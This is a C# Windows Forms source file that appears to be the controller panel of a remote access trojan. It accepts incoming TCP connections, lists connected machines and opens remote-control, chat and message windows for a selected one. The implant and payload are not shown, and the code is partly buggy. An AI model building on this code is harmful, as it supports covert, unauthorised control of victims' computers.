using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Runtime.InteropServices;
using DevComponents.DotNetBar;
using DevComponents.UI;
using DevComponents.WinForms;
namespace WindowsFormsApplication1
{
    public partial class Main : RibbonForm
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        TcpListener TCPListen;
        Thread PortListen;

        // NetworkStream NS;
        // StreamWriter SW;
        // StreamReader SR;
        Socket RatSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        List<int> ItemIndexList = new List<int>();
        public NetworkStream[] NSArray = new NetworkStream[9999];
        int IDNum = 1;
        int Connected = 0;
        bool running = false;
        int ItemIndex = 0;
        public Main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            listViewEx1.ResetHeaderHandler();
            Application.ThreadException += new ThreadExceptionEventHandler(Derped);
            
            //richTextBox1.Text = Text + "\n Listening on port 58899";

        }

        void Listen(int port)
        {

            while (running)
            {
                try
                {
                    TCPListen = new TcpListener(System.Net.IPAddress.Any, port);
                    TCPListen.Start();
                    RatSock = TCPListen.AcceptSocket();
                    IPEndPoint TCPEndPoint = (IPEndPoint)RatSock.RemoteEndPoint;
                    Connected++;
                     Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                    // Invoke(new Action(() => richTextBox1.Text = richTextBox1.Text + "\n Connection from " + IPAddress.Parse(TCPEndPoint.Address.ToString())));
                    //richTextBox1.Text = richTextBox1.Text + "\n Connection from " + IPAddress.Parse(TCPEndPoint.Address.ToString());
                    ListViewItem Item = new ListViewItem(IDNum.ToString(), ItemIndex);
                    ItemIndexList.Add(ItemIndex);
                    Invoke(new Action(() => listViewEx1.Items.Add(Item)));
                    Invoke(new Action(() => Item.SubItems.Add(Environment.UserName)));
                    Invoke(new Action(() => Item.SubItems.Add(TCPEndPoint.Address.ToString())));
                    Invoke(new Action(() => Item.SubItems.Add(Environment.OSVersion.ToString())));
                    //Item.SubItems.Add("Yes");
                    //Item.SubItems.Add(GetActiveWindowTitle());
                    Thread RATClient = new Thread(() => Client(Item, IDNum));
                    RATClient.Start();
                    ItemIndex++;
                }

                catch { }

            }

        }

        void Client(ListViewItem Item, int ID)
        {
            NetworkStream NS = new NetworkStream(RatSock);
            MessageBox.Show(ID.ToString());
            NSArray[ID] = NS;
            IDNum++;
            StreamWriter SW = new StreamWriter(NS);
            StreamReader SR = new StreamReader(NS);
            StringBuilder Input = new StringBuilder();
            while (running)
            {
                //MessageBox.Show(Item.ToString());

                try
                {
                    SR.ReadLine();
                }

                catch
                {
                    try
                    {
                        Random Rand = new Random();
                        int RandSleep = Rand.Next(1000);
                        Thread.Sleep(RandSleep);
                        NS.Close();
                        SW.Close();
                        SR.Close();
                        Input.Clear();
                        Invoke(new Action(() => listViewEx1.Items.Remove(Item)));
                        Connected--;
                        Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                        break;
                    }
                    catch { }
                }
            }
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                //RatSock.Close();
                //TCPListen.Stop();
            }

            catch { }
            Environment.Exit(0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //test = true;
        }

        private void listViewEx1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            { }
            catch { }
        }

        private void listViewEx1_MouseClick(object sender, MouseEventArgs e)
        {
            try
            { }
            catch { }
        }

        private void Derped(object Obj, ThreadExceptionEventArgs Arg)
        {
            //Do this routine when program has dun goofd.
            listViewEx1.Items.Clear();
            RatSock.Blocking = true;
        }

   
        //IGNORE THE BS BELOW ME

      private void metroTabItem2_Click(object sender, EventArgs e)
        {

        }

        private void metroShell1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabItem1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPanel1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPanel2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

       // protected override void WndProc(ref Message m)
       // {
           // if (m.Msg == 0x0112) // WM_SYSCOMMAND
           // {
                // Check your window state here
                //if (m.WParam == new IntPtr(0xF030)) // Maximize event - SC_MAXIMIZE from Winuser.h
               // {
                    // THe window is being maximized
                    //MessageBox.Show("wat");
               // }
           // }
            //base.WndProc(ref m);
       // }

        private void metroShell1_Click_1(object sender, EventArgs e)
        {

        }

        private void metroAppButton1_Click(object sender, EventArgs e)
        {

        }

        private void switchButton1_ValueChanged(object sender, EventArgs e)
        {
            if (switchButton1.Value == false)
            {
                //Turn off &
                //Cleanup
                IDNum = 1;
                running = false;
                TCPListen.Stop();
                RatSock.Close();
                listViewEx1.Items.Clear();
                for (int i = 0; i < NSArray.Length; i++)
                {
                    NSArray[i] = null;
                }
                
                textBoxX1.Enabled = true;
             }

            else
            {
                //Enabled State
                //PREPARIN TO FIRE MAH LAZER
                textBoxX1.Enabled = false;
                running = true;
                PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
                PortListen.Start();
            }
        }

        private void buttonItem19_Click(object sender, EventArgs e)
        {
            //MESSAGE FUNCTION
            Message MessageWND = new Message();
            MessageWND.ShowDialog();
        }

        private void buttonItem34_Click(object sender, EventArgs e)
        {
            Chat Chatbox = new Chat();
            Chatbox.ShowDialog();
        }

        private void buttonItem32_Click(object sender, EventArgs e)
        {
           Remote Remote = new Remote(NSArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
           Remote.ShowDialog();
        }
    }
}
